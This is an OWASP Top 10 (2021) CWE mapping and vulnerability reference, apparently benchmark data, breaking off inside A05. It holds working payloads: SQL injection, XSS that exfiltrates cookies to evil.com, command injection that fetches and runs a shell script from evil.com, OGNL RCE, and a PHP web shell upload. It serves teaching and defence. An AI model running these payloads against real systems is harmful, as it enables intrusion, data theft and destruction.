# OWASP Top 10 (2021) - Comprehensive CWE Mapping & Vulnerability Knowledge Base

> **Purpose**: Foundation dataset for security audit benchmark and vulnerability knowledge base.
> **Source**: OWASP Top 10:2021, MITRE CWE Database, NVD, and security research.
> **Last Updated**: 2026-04-09

---

## Table of Contents

1. [A01:2021 - Broken Access Control](#a012021---broken-access-control)
2. [A02:2021 - Cryptographic Failures](#a022021---cryptographic-failures)
3. [A03:2021 - Injection](#a032021---injection)
4. [A04:2021 - Insecure Design](#a042021---insecure-design)
5. [A05:2021 - Security Misconfiguration](#a052021---security-misconfiguration)
6. [A06:2021 - Vulnerable and Outdated Components](#a062021---vulnerable-and-outdated-components)
7. [A07:2021 - Identification and Authentication Failures](#a072021---identification-and-authentication-failures)
8. [A08:2021 - Software and Data Integrity Failures](#a082021---software-and-data-integrity-failures)
9. [A09:2021 - Security Logging and Monitoring Failures](#a092021---security-logging-and-monitoring-failures)
10. [A10:2021 - Server-Side Request Forgery (SSRF)](#a102021---server-side-request-forgery-ssrf)

---

## A01:2021 - Broken Access Control

### Description

Broken Access Control moved to the #1 position from #5 in the OWASP Top 10:2021. Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data, or performing business functions outside the user's limits.

94% of applications were tested for some form of broken access control, with a max incidence rate of 55.97% and an average incidence rate of 3.81%. Over 318,000 occurrences were documented.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 34 |
| Max Incidence Rate | 55.97% |
| Avg Incidence Rate | 3.81% |
| Avg Weighted Exploit | 6.92 |
| Avg Weighted Impact | 5.93 |
| Total Occurrences | 318k+ |
| Total CVEs | 19,013 |

### Mapped CWEs (34 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-22 | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | 5.3-7.5 | Medium-High |
| CWE-23 | Relative Path Traversal | 5.3-7.5 | Medium-High |
| CWE-35 | Path Traversal: '.../...//' | 5.3-7.5 | Medium-High |
| CWE-59 | Improper Link Resolution Before File Access ('Link Following') | 5.5-7.8 | Medium-High |
| CWE-200 | Exposure of Sensitive Information to an Unauthorized Actor | 5.3-7.5 | Medium-High |
| CWE-201 | Insertion of Sensitive Information Into Sent Data | 5.3-7.5 | Medium-High |
| CWE-219 | Storage of File with Sensitive Data Under Web Root | 5.3-7.5 | Medium-High |
| CWE-264 | Permissions, Privileges, and Access Controls | 4.3-9.8 | Medium-Critical |
| CWE-275 | Permission Issues | 4.3-8.8 | Medium-High |
| CWE-276 | Incorrect Default Permissions | 5.5-7.8 | Medium-High |
| CWE-284 | Improper Access Control | 5.3-9.8 | Medium-Critical |
| CWE-285 | Improper Authorization | 6.5-9.8 | Medium-Critical |
| CWE-352 | Cross-Site Request Forgery (CSRF) | 4.3-8.8 | Medium-High |
| CWE-359 | Exposure of Private Personal Information to an Unauthorized Actor | 5.3-7.5 | Medium-High |
| CWE-377 | Insecure Temporary File | 5.5-7.0 | Medium-High |
| CWE-402 | Transmission of Private Resources into a New Sphere ('Resource Leak') | 3.3-5.5 | Low-Medium |
| CWE-425 | Direct Request ('Forced Browsing') | 5.3-7.5 | Medium-High |
| CWE-441 | Unintended Proxy or Intermediary ('Confused Deputy') | 6.5-9.8 | Medium-Critical |
| CWE-497 | Exposure of Sensitive System Information to an Unauthorized Control Sphere | 5.3-7.5 | Medium-High |
| CWE-538 | Insertion of Sensitive Information into Externally-Accessible File or Directory | 5.3-7.5 | Medium-High |
| CWE-540 | Inclusion of Sensitive Information in Source Code | 5.3-7.5 | Medium-High |
| CWE-548 | Exposure of Information Through Directory Listing | 5.3 | Medium |
| CWE-552 | Files or Directories Accessible to External Parties | 5.3-7.5 | Medium-High |
| CWE-566 | Authorization Bypass Through User-Controlled SQL Primary Key | 6.5-8.8 | Medium-High |
| CWE-601 | URL Redirection to Untrusted Site ('Open Redirect') | 4.7-6.1 | Medium |
| CWE-639 | Authorization Bypass Through User-Controlled Key | 6.5-8.8 | Medium-High |
| CWE-651 | Exposure of WSDL File Containing Sensitive Information | 5.3 | Medium |
| CWE-668 | Exposure of Resource to Wrong Sphere | 5.3-7.5 | Medium-High |
| CWE-706 | Use of Incorrectly-Resolved Name or Reference | 5.3-9.8 | Medium-Critical |
| CWE-862 | Missing Authorization | 5.3-9.8 | Medium-Critical |
| CWE-863 | Incorrect Authorization | 6.5-9.8 | Medium-Critical |
| CWE-913 | Improper Control of Dynamically-Managed Code Resources | 7.5-9.8 | High-Critical |
| CWE-922 | Insecure Storage of Sensitive Information | 5.3-7.5 | Medium-High |
| CWE-1275 | Sensitive Cookie with Improper SameSite Attribute | 4.3-6.5 | Medium |

### Common Attack Patterns & Payloads

#### 1. Insecure Direct Object Reference (IDOR)
```
# Original request
GET /api/users/1001/profile HTTP/1.1

# Attacker modifies the ID to access another user's data
GET /api/users/1002/profile HTTP/1.1

# Parameter tampering in query strings
GET /account?acct=notmyacct HTTP/1.1
```

#### 2. Forced Browsing / Privilege Escalation
```
# Accessing admin pages without authorization
GET /admin/dashboard HTTP/1.1
GET /app/admin_getappInfo HTTP/1.1
GET /admin/deleteUser?id=1001 HTTP/1.1

# Accessing API endpoints meant for higher privileges
POST /api/admin/users HTTP/1.1
PUT /api/users/1001/role HTTP/1.1
Content-Type: application/json
{"role": "admin"}
```

#### 3. Path Traversal
```
# Reading sensitive files
GET /download?file=../../../etc/passwd HTTP/1.1
GET /static/../../../etc/shadow HTTP/1.1
GET /files?path=....//....//....//etc/passwd HTTP/1.1

# Windows variants
GET /download?file=..\..\..\..\windows\system32\config\sam HTTP/1.1
```

#### 4. JWT / Token Manipulation
```
# Changing algorithm to 'none'
Header: {"alg": "none", "typ": "JWT"}

# Modifying claims
Payload: {"sub": "1234567890", "role": "admin", "iat": 1516239022}

# Using symmetric key when asymmetric expected
Header: {"alg": "HS256", "typ": "JWT"}  (signing with public key)
```

#### 5. CORS Misconfiguration
```
# Testing for wildcard or reflective CORS
Origin: https://evil.com

# Vulnerable response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable (IDOR):**
```http
GET /api/users/9999/profile HTTP/1.1
Authorization: Bearer <token_for_user_1001>

HTTP/1.1 200 OK
{"id": 9999, "name": "Other User", "email": "other@example.com", "ssn": "123-45-6789"}
```

**Safe:**
```http
GET /api/users/9999/profile HTTP/1.1
Authorization: Bearer <token_for_user_1001>

HTTP/1.1 403 Forbidden
{"error": "Access denied", "message": "You do not have permission to access this resource"}
```

### Real-World Examples

- **Facebook (2018)**: IDOR vulnerability allowed attackers to view private photos of 6.8 million users via the photo API.
- **Optus (2023)**: IDOR allowed enumeration of nearly 10 million telecom customer records.
- **MGM Resorts (2023)**: Attackers exploited weak access controls to gain super administrator privileges.
- **GitHub (2022)**: Privilege escalation bug allowed users to gain unauthorized higher access levels within repositories.
- **MOVEit Transfer (CVE-2023-34362)**: Missing authentication on critical endpoint led to exploitation by Cl0p ransomware group.

---

## A02:2021 - Cryptographic Failures

### Description

Previously known as "Sensitive Data Exposure" (A3:2017), this category was renamed to focus on the root cause: failures related to cryptography (or lack thereof). This includes failure to encrypt data in transit and at rest, use of weak or deprecated algorithms, improper key management, and insufficient randomness.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 29 |
| Max Incidence Rate | 46.44% |
| Avg Incidence Rate | 4.49% |
| Avg Weighted Exploit | 7.29 |
| Avg Weighted Impact | 6.81 |
| Total Occurrences | 233,788 |
| Total CVEs | 3,075 |

### Mapped CWEs (29 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-261 | Weak Encoding for Password | 5.3-7.5 | Medium-High |
| CWE-296 | Improper Following of a Certificate's Chain of Trust | 5.9-7.4 | Medium-High |
| CWE-310 | Cryptographic Issues | 5.3-7.5 | Medium-High |
| CWE-319 | Cleartext Transmission of Sensitive Information | 5.3-7.5 | Medium-High |
| CWE-321 | Use of Hard-coded Cryptographic Key | 5.3-7.5 | Medium-High |
| CWE-322 | Key Exchange without Entity Authentication | 5.9-7.5 | Medium-High |
| CWE-323 | Reusing a Nonce, Key Pair in Encryption | 5.3-7.5 | Medium-High |
| CWE-324 | Use of a Key Past its Expiration Date | 5.3-7.5 | Medium-High |
| CWE-325 | Missing Required Cryptographic Step | 5.3-7.5 | Medium-High |
| CWE-326 | Inadequate Encryption Strength | 5.3-7.5 | Medium-High |
| CWE-327 | Use of a Broken or Risky Cryptographic Algorithm | 5.3-7.5 | Medium-High |
| CWE-328 | Use of Weak Hash | 5.3-7.5 | Medium-High |
| CWE-329 | Generation of Predictable IV with CBC Mode | 5.3-7.5 | Medium-High |
| CWE-330 | Use of Insufficiently Random Values | 5.3-7.5 | Medium-High |
| CWE-331 | Insufficient Entropy | 5.3-7.5 | Medium-High |
| CWE-335 | Incorrect Usage of Seeds in Pseudo-Random Number Generator (PRNG) | 5.3-7.5 | Medium-High |
| CWE-336 | Same Seed in Pseudo-Random Number Generator (PRNG) | 5.3-7.5 | Medium-High |
| CWE-337 | Predictable Seed in Pseudo-Random Number Generator (PRNG) | 5.3-7.5 | Medium-High |
| CWE-338 | Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG) | 5.3-7.5 | Medium-High |
| CWE-340 | Generation of Predictable Numbers or Identifiers | 5.3-7.5 | Medium-High |
| CWE-347 | Improper Verification of Cryptographic Signature | 5.3-7.5 | Medium-High |
| CWE-523 | Unprotected Transport of Credentials | 5.3-7.5 | Medium-High |
| CWE-720 | OWASP Top Ten 2007 Category A9 - Insecure Communications | 5.3-7.5 | Medium-High |
| CWE-757 | Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade') | 5.9-7.5 | Medium-High |
| CWE-759 | Use of a One-Way Hash without a Salt | 5.3-7.5 | Medium-High |
| CWE-760 | Use of a One-Way Hash with a Predictable Salt | 5.3-7.5 | Medium-High |
| CWE-780 | Use of RSA Algorithm without OAEP | 5.3-7.5 | Medium-High |
| CWE-818 | Insufficient Transport Layer Protection | 5.3-7.5 | Medium-High |
| CWE-916 | Use of Password Hash With Insufficient Computational Effort | 5.3-7.5 | Medium-High |

### Common Attack Patterns & Payloads

#### 1. Protocol Downgrade Attack
```
# Attacker intercepts connection and downgrades HTTPS to HTTP
# Using tools like sslstrip:
sslstrip -l 8080

# Forcing HTTP by manipulating redirects
GET http://example.com/login HTTP/1.1
# Instead of HTTPS

# POODLE attack (forcing SSLv3)
openssl s_client -ssl3 -connect example.com:443
```

#### 2. Exploiting Weak Hashing
```python
# Vulnerable: MD5 hashing without salt
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# Vulnerable: SHA-1 without salt
password_hash = hashlib.sha1(password.encode()).hexdigest()

# Attack: Rainbow table lookup
# Hash "5f4dcc3b5aa765d61d8327deb882cf99" -> "password" (MD5)
# Hash "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8" -> "password" (SHA-1)
```

#### 3. Hard-coded Key Exploitation
```java
// Vulnerable: Hard-coded encryption key in source code
private static final String SECRET_KEY = "MySecretKey12345";
Cipher cipher = Cipher.getInstance("AES");
SecretKeySpec keySpec = new SecretKeySpec(SECRET_KEY.getBytes(), "AES");

// Attacker extracts key from decompiled code and decrypts all data
```

#### 4. Padding Oracle Attack
```
# Testing for padding oracle on CBC-mode encrypted cookies
# Sending modified ciphertext and observing error differences:
# - "Invalid padding" -> oracle leak
# - "Invalid MAC" -> oracle leak
# Tool: PadBuster
padbuster https://example.com/login <encrypted_cookie> 8 -cookies auth=<encrypted_cookie>
```

#### 5. Insufficient TLS Configuration
```
# Testing for weak ciphers
nmap --script ssl-enum-ciphers -p 443 example.com

# Testing for missing HSTS
curl -I https://example.com | grep -i strict-transport

# Checking for mixed content
# Any HTTP resource loaded on an HTTPS page
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable (Missing HSTS):**
```http
HTTP/1.1 200 OK
Content-Type: text/html
# No Strict-Transport-Security header
# No secure flag on session cookies
Set-Cookie: session=abc123; Path=/
```

**Safe:**
```http
HTTP/1.1 200 OK
Content-Type: text/html
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Set-Cookie: session=abc123; Path=/; Secure; HttpOnly; SameSite=Strict
```

**Vulnerable (Weak password storage):**
```python
# Storing MD5 hash
stored_hash = "5f4dcc3b5aa765d61d8327deb882cf99"  # MD5 of "password"
```

**Safe:**
```python
# Using bcrypt with cost factor
import bcrypt
hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))
```

### Real-World Examples

- **Heartbleed (CVE-2014-0160)**: OpenSSL vulnerability allowed reading server memory, exposing private keys, passwords, and session tokens. Affected an estimated 17% of all secure web servers.
- **Equifax Breach (2017)**: Unencrypted sensitive data and failure to patch known vulnerabilities led to exposure of 143 million customer records. Remediation cost exceeded $1.4 billion.
- **RockYou2021**: Compilation of 8.4 billion passwords released in plaintext from organizations that stored passwords with no hashing or easily crackable weak hashing.
- **Adobe (2013)**: 153 million user records breached; passwords were encrypted with 3DES in ECB mode (not hashed), allowing pattern analysis.
- **LinkedIn (2012)**: 6.5 million password hashes (unsalted SHA-1) leaked and cracked.

---

## A03:2021 - Injection

### Description

Injection slides down to the third position. 94% of applications were tested for some form of injection with a max incidence rate of 19%, an average incidence rate of 3.41%, and 274k occurrences. An application is vulnerable to injection when user-supplied data is not validated, filtered, or sanitized; dynamic queries or non-parameterized calls are used without context-aware escaping; or hostile data is used within ORM search parameters or concatenated into SQL/commands.

Notable injection types: SQL, NoSQL, OS Command, ORM, LDAP, Expression Language (EL), OGNL injection. Cross-site Scripting (XSS) is also included in this category in 2021.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 33 |
| Max Incidence Rate | 19.09% |
| Avg Incidence Rate | 3.41% |
| Avg Weighted Exploit | 7.25 |
| Avg Weighted Impact | 7.15 |
| Total Occurrences | 274k |
| Total CVEs | 32,078 |

### Mapped CWEs (33 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-20 | Improper Input Validation | 5.3-9.8 | Medium-Critical |
| CWE-74 | Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') | 6.1-9.8 | Medium-Critical |
| CWE-75 | Failure to Sanitize Special Elements into a Different Plane (Special Element Injection) | 5.3-7.5 | Medium-High |
| CWE-77 | Improper Neutralization of Special Elements used in a Command ('Command Injection') | 7.5-10.0 | High-Critical |
| CWE-78 | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | 7.5-10.0 | High-Critical |
| CWE-79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | 4.3-6.1 (Reflected), 5.4-8.0 (Stored) | Medium-High |
| CWE-80 | Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) | 4.3-6.1 | Medium |
| CWE-83 | Improper Neutralization of Script in Attributes in a Web Page | 4.3-6.1 | Medium |
| CWE-87 | Improper Neutralization of Alternate XSS Syntax | 4.3-6.1 | Medium |
| CWE-88 | Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') | 7.5-9.8 | High-Critical |
| CWE-89 | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') | 8.1-9.8 | High-Critical |
| CWE-90 | Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection') | 7.5-9.8 | High-Critical |
| CWE-91 | XML Injection (aka Blind XPath Injection) | 5.3-7.5 | Medium-High |
| CWE-93 | Improper Neutralization of CRLF Sequences ('CRLF Injection') | 5.3-6.1 | Medium |
| CWE-94 | Improper Control of Generation of Code ('Code Injection') | 7.5-9.8 | High-Critical |
| CWE-95 | Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection') | 7.5-9.8 | High-Critical |
| CWE-96 | Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection') | 7.5-9.8 | High-Critical |
| CWE-97 | Improper Neutralization of Server-Side Includes (SSI) Within a Web Page | 5.3-7.5 | Medium-High |
| CWE-98 | Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion') | 7.5-9.8 | High-Critical |
| CWE-99 | Improper Control of Resource Identifiers ('Resource Injection') | 5.3-7.5 | Medium-High |
| CWE-100 | Deprecated: Technology-Specific Input Validation Problems | N/A | N/A |
| CWE-113 | Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting') | 5.3-6.1 | Medium |
| CWE-116 | Improper Encoding or Escaping of Output | 5.3-7.5 | Medium-High |
| CWE-138 | Improper Neutralization of Special Elements | 5.3-7.5 | Medium-High |
| CWE-184 | Incomplete List of Disallowed Inputs | 5.3-7.5 | Medium-High |
| CWE-470 | Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') | 7.5-9.8 | High-Critical |
| CWE-471 | Modification of Assumed-Immutable Data (MAID) | 5.3-7.5 | Medium-High |
| CWE-564 | SQL Injection: Hibernate | 8.1-9.8 | High-Critical |
| CWE-610 | Externally Controlled Reference to a Resource in Another Sphere | 5.3-7.5 | Medium-High |
| CWE-643 | Improper Neutralization of Data within XPath Expressions ('XPath Injection') | 5.3-7.5 | Medium-High |
| CWE-644 | Improper Neutralization of HTTP Headers for Scripting Syntax | 5.3-6.1 | Medium |
| CWE-652 | Improper Neutralization of Data within XQuery Expressions ('XQuery Injection') | 5.3-7.5 | Medium-High |
| CWE-917 | Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection') | 7.5-9.8 | High-Critical |

### Common Attack Patterns & Payloads

#### 1. SQL Injection (CWE-89)
```sql
-- Authentication bypass
' OR '1'='1' --
' OR '1'='1' /*
admin' --
' OR 1=1#

-- UNION-based data extraction
' UNION SELECT username, password FROM users --
' UNION SELECT NULL, table_name FROM information_schema.tables --
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --

-- Time-based blind SQLi
' AND SLEEP(5) --
' WAITFOR DELAY '0:0:10' --
'; IF (1=1) WAITFOR DELAY '0:0:5' --

-- Error-based SQLi
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
' AND extractvalue(1, concat(0x7e, (SELECT version()))) --

-- Stacked queries
'; DROP TABLE users; --
'; INSERT INTO users(username,password) VALUES('attacker','password'); --

-- Out-of-band SQLi
'; EXEC xp_dirtree '\\attacker.com\share' --
```

**Vulnerable code:**
```java
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Safe code:**
```java
PreparedStatement pstmt = connection.prepareStatement("SELECT * FROM accounts WHERE custID = ?");
pstmt.setString(1, request.getParameter("id"));
ResultSet rs = pstmt.executeQuery();
```

#### 2. Cross-Site Scripting / XSS (CWE-79)
```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>
<script>document.location='http://evil.com/steal?c='+document.cookie</script>

<!-- Stored XSS -->
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">

<!-- DOM-based XSS -->
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">

<!-- Filter bypass variants -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#x61;lert('XSS')">
<svg/onload=alert('XSS')>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">

<!-- Attribute injection -->
" onfocus="alert('XSS')" autofocus="
' onclick='alert(1)' x='

<!-- Event handler XSS -->
<div onmouseover="alert('XSS')">hover me</div>
<input type="text" value="" onfocus="alert('XSS')" autofocus>
```

**Vulnerable code:**
```html
<!-- Server reflects user input without encoding -->
<p>Search results for: ${userInput}</p>
```

**Safe code:**
```html
<!-- HTML entity encoding applied -->
<p>Search results for: ${fn:escapeXml(userInput)}</p>
```

#### 3. OS Command Injection (CWE-78)
```bash
# Basic command injection
; ls -la
| cat /etc/passwd
`whoami`
$(id)

# Chained commands
; cat /etc/passwd
&& cat /etc/shadow
|| cat /etc/hosts
; wget http://evil.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh

# Blind command injection (time-based)
; sleep 10
| ping -c 10 127.0.0.1

# Out-of-band
; nslookup attacker.com
; curl http://attacker.com/$(whoami)
```

#### 4. LDAP Injection (CWE-90)
```
# Authentication bypass
*)(uid=*))(|(uid=*
admin)(&)
*))%00

# Data extraction
*)(|(objectClass=*))
```

#### 5. Expression Language Injection (CWE-917)
```java
// OGNL Injection (Struts2)
%{(#_memberAccess['allowStaticMethodAccess']=true).(#cmd='id').(#iswin=(@java.lang.Runtime@getRuntime().exec(#cmd)))}

// Spring EL Injection
${T(java.lang.Runtime).getRuntime().exec('id')}

// Thymeleaf SSTI
${T(java.lang.Runtime).getRuntime().exec('calc')}
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable (SQL Injection):**
```http
GET /search?q=' OR '1'='1 HTTP/1.1

HTTP/1.1 200 OK
Content-Type: application/json
[{"id":1,"name":"Alice","email":"alice@ex.com","ssn":"111-22-3333"},
 {"id":2,"name":"Bob","email":"bob@ex.com","ssn":"444-55-6666"},
 ...all records returned...]
```

**Safe:**
```http
GET /search?q=' OR '1'='1 HTTP/1.1

HTTP/1.1 200 OK
Content-Type: application/json
[]  # No results (query treated as literal string)
```

**Vulnerable (XSS reflected back):**
```http
GET /search?q=<script>alert(1)</script> HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html
<p>Results for: <script>alert(1)</script></p>
```

**Safe:**
```http
GET /search?q=<script>alert(1)</script> HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html
Content-Security-Policy: default-src 'self'
X-XSS-Protection: 0
<p>Results for: &lt;script&gt;alert(1)&lt;/script&gt;</p>
```

### Real-World Examples

- **Equifax Breach (2017)**: Apache Struts vulnerability (CVE-2017-5638) - OGNL injection via Content-Type header led to 143 million records exposed.
- **TalkTalk (2015)**: SQL injection attack compromised 157,000 customer accounts.
- **Sony Pictures (2014)**: SQL injection was among the attack vectors used in the devastating breach.
- **British Airways (2018)**: Magecart XSS attack injected malicious JavaScript into the payment page, stealing 380,000 payment card details.
- **Samy Worm (2005)**: Stored XSS on MySpace propagated across 1 million profiles in 20 hours.

---

## A04:2021 - Insecure Design

### Description

A new category for 2021. Insecure design is a broad category representing different weaknesses, expressed as "missing or ineffective control design." It focuses on risks related to design and architectural flaws, calling for more use of threat modeling, secure design patterns, and reference architectures. An insecure design cannot be fixed by a perfect implementation, as by definition the needed security controls were never created to defend against specific attacks.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 40 |
| Max Incidence Rate | 24.19% |
| Avg Incidence Rate | 3.00% |
| Avg Weighted Exploit | 6.46 |
| Avg Weighted Impact | 6.78 |
| Total Occurrences | 262,407 |
| Total CVEs | 2,691 |

### Mapped CWEs (40 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-73 | External Control of File Name or Path | 5.3-7.5 | Medium-High |
| CWE-183 | Permissive List of Allowed Inputs | 5.3-7.5 | Medium-High |
| CWE-209 | Generation of Error Message Containing Sensitive Information | 4.3-5.3 | Medium |
| CWE-213 | Exposure of Sensitive Information Due to Incompatible Policies | 5.3-7.5 | Medium-High |
| CWE-235 | Improper Handling of Extra Parameters | 5.3-7.5 | Medium-High |
| CWE-256 | Plaintext Storage of a Password | 5.5-7.5 | Medium-High |
| CWE-257 | Storing Passwords in a Recoverable Format | 5.5-7.5 | Medium-High |
| CWE-266 | Incorrect Privilege Assignment | 6.5-8.8 | Medium-High |
| CWE-269 | Improper Privilege Management | 6.5-8.8 | Medium-High |
| CWE-280 | Improper Handling of Insufficient Permissions or Privileges | 5.3-7.5 | Medium-High |
| CWE-311 | Missing Encryption of Sensitive Data | 5.3-7.5 | Medium-High |
| CWE-312 | Cleartext Storage of Sensitive Information | 5.3-7.5 | Medium-High |
| CWE-313 | Cleartext Storage in a File or on Disk | 5.3-7.5 | Medium-High |
| CWE-316 | Cleartext Storage of Sensitive Information in Memory | 5.3-7.5 | Medium-High |
| CWE-419 | Unprotected Primary Channel | 5.3-7.5 | Medium-High |
| CWE-430 | Deployment of Wrong Handler | 5.3-7.5 | Medium-High |
| CWE-434 | Unrestricted Upload of File with Dangerous Type | 7.5-9.8 | High-Critical |
| CWE-444 | Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') | 5.3-9.8 | Medium-Critical |
| CWE-451 | User Interface (UI) Misrepresentation of Critical Information | 4.3-6.5 | Medium |
| CWE-472 | External Control of Assumed-Immutable Web Parameter | 5.3-7.5 | Medium-High |
| CWE-501 | Trust Boundary Violation | 5.3-7.5 | Medium-High |
| CWE-522 | Insufficiently Protected Credentials | 5.3-7.5 | Medium-High |
| CWE-525 | Use of Web Browser Cache Containing Sensitive Information | 3.3-5.3 | Low-Medium |
| CWE-539 | Use of Persistent Cookies Containing Sensitive Information | 3.3-5.3 | Low-Medium |
| CWE-579 | J2EE Bad Practices: Non-serializable Object Stored in Session | 3.3-5.3 | Low-Medium |
| CWE-598 | Use of GET Request Method With Sensitive Query Strings | 3.3-5.3 | Low-Medium |
| CWE-602 | Client-Side Enforcement of Server-Side Security | 5.3-8.8 | Medium-High |
| CWE-642 | External Control of Critical State Data | 5.3-8.8 | Medium-High |
| CWE-646 | Reliance on File Name or Extension of Externally-Supplied File | 5.3-7.5 | Medium-High |
| CWE-650 | Trusting HTTP Permission Methods on the Server Side | 5.3-7.5 | Medium-High |
| CWE-653 | Improper Isolation or Compartmentalization | 5.3-7.5 | Medium-High |
| CWE-656 | Reliance on Security Through Obscurity | 5.3-7.5 | Medium-High |
| CWE-657 | Violation of Secure Design Principles | 5.3-7.5 | Medium-High |
| CWE-799 | Improper Control of Interaction Frequency | 5.3-7.5 | Medium-High |
| CWE-807 | Reliance on Untrusted Inputs in a Security Decision | 5.3-8.8 | Medium-High |
| CWE-840 | Business Logic Errors | 5.3-8.8 | Medium-High |
| CWE-841 | Improper Enforcement of Behavioral Workflow | 5.3-8.8 | Medium-High |
| CWE-927 | Use of Implicit Intent for Sensitive Communication | 5.3-7.5 | Medium-High |
| CWE-1021 | Improper Restriction of Rendered UI Layers or Frames (Clickjacking) | 4.3-6.1 | Medium |
| CWE-1173 | Improper Use of Validation Framework | 5.3-7.5 | Medium-High |

### Common Attack Patterns & Payloads

#### 1. Business Logic Abuse
```
# Bulk ticket reservation without rate limiting
POST /api/reservations HTTP/1.1
Content-Type: application/json
{"movie_id": 123, "seats": 300}  # Reserving all seats at once

# Price manipulation via client-side values
POST /api/checkout HTTP/1.1
Content-Type: application/json
{"item_id": 1, "quantity": 1, "price": 0.01}  # Overriding server-side price

# Coupon stacking / race conditions
POST /api/apply-coupon HTTP/1.1  # Sent 100 times concurrently
{"coupon": "50OFF"}
```

#### 2. Credential Recovery Abuse
```
# Knowledge-based security questions (insecure by design)
POST /api/reset-password HTTP/1.1
{"email": "victim@example.com", "security_answer": "Smith"}
# Answers are often publicly available or easily guessable

# No rate limiting on password reset
POST /api/reset-password HTTP/1.1
{"email": "victim@example.com"}
# Sent repeatedly to flood victim's inbox
```

#### 3. File Upload Abuse (CWE-434)
```
# Uploading a web shell disguised as an image
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

#### 4. Clickjacking (CWE-1021)
```html
<!-- Attacker's page embedding victim site in iframe -->
<style>
  iframe { opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
  .decoy { position: relative; z-index: -1; }
</style>
<div class="decoy">
  <h1>Click here to win a prize!</h1>
  <button>Claim Prize</button>
</div>
<iframe src="https://victim.com/transfer?amount=10000&to=attacker"></iframe>
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable (No rate limiting):**
```http
POST /api/login HTTP/1.1
{"username": "admin", "password": "attempt_9999"}

HTTP/1.1 401 Unauthorized
{"error": "Invalid credentials"}
# Application allows unlimited login attempts
```

**Safe:**
```http
POST /api/login HTTP/1.1
{"username": "admin", "password": "attempt_6"}

HTTP/1.1 429 Too Many Requests
Retry-After: 300
{"error": "Account temporarily locked. Try again in 5 minutes."}
```

### Real-World Examples

- **Ticketmaster Scalping**: Lack of bot protection and rate limiting enabled automated bulk purchases of event tickets.
- **Facebook Quiz Data Harvesting (2018)**: Design flaw allowing third-party apps to access friends' data without explicit consent.
- **Zoom Bombing (2020)**: Insecure default settings (no passwords, no waiting rooms) allowed uninvited participants to join meetings.
- **Instagram Account Enumeration**: Password reset flow revealed whether an email/phone was registered, enabling reconnaissance.

---

## A05:2021 - Security Misconfiguration

### Description

Security Misconfiguration moved up from #6 in the previous edition. 90% of applications were tested for some form of misconfiguration, with an average incidence rate of 4.51% and over 208k occurrences. With more shifts into highly configurable software, it's not surprising to see this category move up. The former category for XML External Entities (XXE) is now part of this category.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 20 |
| Max Incidence Rate | 19.84% |
| Avg Incidence Rate | 4.51% |
| Avg Weighted Exploit | 8.12 |
| Avg Weighted Impact | 6.56 |
| Total Occurrences | 208,387 |
| Total CVEs | 789 |

### Mapped CWEs (20 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-2 | 7PK - Environment | 5.3-7.5 | Medium-High |
| CWE-11 | ASP.NET Misconfiguration: Creating Debug Binary | 5.3 | Medium |
| CWE-13 | ASP.NET Misconfiguration: Password in Configuration File | 5.3-7.5 | Medium-High |
